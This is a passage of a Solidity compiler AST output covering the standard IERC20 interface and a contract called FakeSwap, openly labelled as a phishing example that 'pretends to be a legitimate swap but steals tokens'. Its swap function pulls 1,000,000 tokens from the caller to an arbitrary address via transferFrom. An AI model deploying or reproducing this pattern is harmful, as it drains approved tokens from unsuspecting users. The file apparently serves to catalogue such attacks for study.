												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "971:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 31,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "971:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "970:9:0"
									},
									"scope": 77,
									"src": "912:68:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 35,
										"nodeType": "StructuredDocumentation",
										"src": "986:213:0",
										"text": " @dev Moves a `value` amount of tokens from the caller's account to `to`.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "a9059cbb",
									"id": 44,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nameLocation": "1213:8:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 37,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "1230:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1222:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 36,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1222:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 39,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "1242:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1234:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 38,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1234:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1221:27:0"
									},
									"returnParameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 42,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1267:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 41,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1267:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1266:6:0"
									},
									"scope": 77,
									"src": "1204:69:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 45,
										"nodeType": "StructuredDocumentation",
										"src": "1279:264:0",
										"text": " @dev Returns the remaining number of tokens that `spender` will be\n allowed to spend on behalf of `owner` through {transferFrom}. This is\n zero by default.\n This value changes when {approve} or {transferFrom} are called."
									},
									"functionSelector": "dd62ed3e",
									"id": 54,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nameLocation": "1557:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 50,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 47,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "1575:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1567:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 46,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1567:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 49,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "1590:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1582:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 48,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1582:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1566:32:0"
									},
									"returnParameters": {
										"id": 53,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1622:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 51,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1622:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1621:9:0"
									},
									"scope": 77,
									"src": "1548:83:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 55,
										"nodeType": "StructuredDocumentation",
										"src": "1637:667:0",
										"text": " @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n caller's tokens.\n Returns a boolean value indicating whether the operation succeeded.\n IMPORTANT: Beware that changing an allowance with this method brings the risk\n that someone may use both the old and the new allowance by unfortunate\n transaction ordering. One possible solution to mitigate this race\n condition is to first reduce the spender's allowance to 0 and set the\n desired value afterwards:\n https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n Emits an {Approval} event."
									},
									"functionSelector": "095ea7b3",
									"id": 64,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nameLocation": "2318:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 57,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "2334:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2326:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 56,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2326:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 59,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "2351:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2343:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 58,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2343:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2325:32:0"
									},
									"returnParameters": {
										"id": 63,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 62,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2376:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 61,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2376:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2375:6:0"
									},
									"scope": 77,
									"src": "2309:73:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 65,
										"nodeType": "StructuredDocumentation",
										"src": "2388:297:0",
										"text": " @dev Moves a `value` amount of tokens from `from` to `to` using the\n allowance mechanism. `value` is then deducted from the caller's\n allowance.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "23b872dd",
									"id": 76,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nameLocation": "2699:12:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 67,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "2720:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2712:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 66,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2712:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 69,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "2734:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2726:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 68,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2726:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 71,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "2746:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2738:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 70,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2738:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2711:41:0"
									},
									"returnParameters": {
										"id": 75,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 74,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2771:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 73,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2771:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2770:6:0"
									},
									"scope": 77,
									"src": "2690:87:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 78,
							"src": "204:2575:0",
							"usedErrors": [],
							"usedEvents": [
								11,
								20
							]
						}
					],
					"src": "106:2674:0"
				},
				"id": 0
			},
			"M/Malicious Frontend Swap (User Phishing).sol": {
				"ast": {
					"absolutePath": "M/Malicious Frontend Swap (User Phishing).sol",
					"exportedSymbols": {
						"FakeSwap": [
							100
						],
						"IERC20": [
							77
						]
					},
					"id": 101,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 79,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".20"
							],
							"nodeType": "PragmaDirective",
							"src": "32:24:1"
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"file": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"id": 80,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 101,
							"sourceUnit": 78,
							"src": "58:56:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "FakeSwap",
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": {
								"id": 81,
								"nodeType": "StructuredDocumentation",
								"src": "116:117:1",
								"text": "@title Malicious Frontend Swap (Phishing Example)\n @notice Pretends to be a legitimate swap but steals tokens"
							},
							"fullyImplemented": true,
							"id": 100,
							"linearizedBaseContracts": [
								100
							],
							"name": "FakeSwap",
							"nameLocation": "242:8:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 98,
										"nodeType": "Block",
										"src": "307:146:1",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 92,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "414:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 93,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "418:6:1",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "414:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 94,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 85,
															"src": "426:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "315f3030305f303030",
															"id": 95,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "430:15:1",
															"subdenomination": "ether",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1000000000000000000000000_by_1",
																"typeString": "int_const 1000000000000000000000000"
															},
															"value": "1_000_000"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_1000000000000000000000000_by_1",
																"typeString": "int_const 1000000000000000000000000"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 89,
																	"name": "token",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 83,
																	"src": "394:5:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 88,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 77,
																"src": "387:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$77_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 90,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "387:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$77",
																"typeString": "contract IERC20"
															}
														},
														"id": 91,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "401:12:1",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 76,
														"src": "387:26:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 96,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "387:59:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 97,
												"nodeType": "ExpressionStatement",
												"src": "387:59:1"
											}
										]
									},
									"functionSelector": "6b76484e",
									"id": 99,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nameLocation": "266:4:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 86,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 83,
												"mutability": "mutable",
												"name": "token",
												"nameLocation": "279:5:1",
												"nodeType": "VariableDeclaration",
												"scope": 99,
												"src": "271:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 82,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "271:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 85,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "294:2:1",
												"nodeType": "VariableDeclaration",
												"scope": 99,
												"src": "286:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 84,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "286:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "270:27:1"
									},
									"returnParameters": {
										"id": 87,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "307:0:1"
									},
									"scope": 100,
									"src": "257:196:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 101,
							"src": "233:222:1",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:424:1"
				},
				"id": 1
			}
		}
	}
}